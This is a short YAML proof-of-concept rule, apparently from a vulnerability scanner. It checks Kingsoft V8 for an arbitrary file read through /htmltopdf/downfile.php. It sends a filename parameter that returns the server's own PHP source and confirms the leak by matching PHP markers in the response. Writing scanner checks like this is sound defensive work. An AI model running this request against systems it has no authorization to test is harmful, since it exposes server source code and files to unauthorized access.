name: poc-yaml-kingsoft-v8-file-read
rules:
  - method: GET
    path: >-
      /htmltopdf/downfile.php?filename=downfile.php
    follow_redirects: false 
    expression: |
      response.status == 200 && response.body.bcontains(b'<?php') && response.body.bcontains(b'$filename') && response.headers["Content-Type"].contains("application/zip")

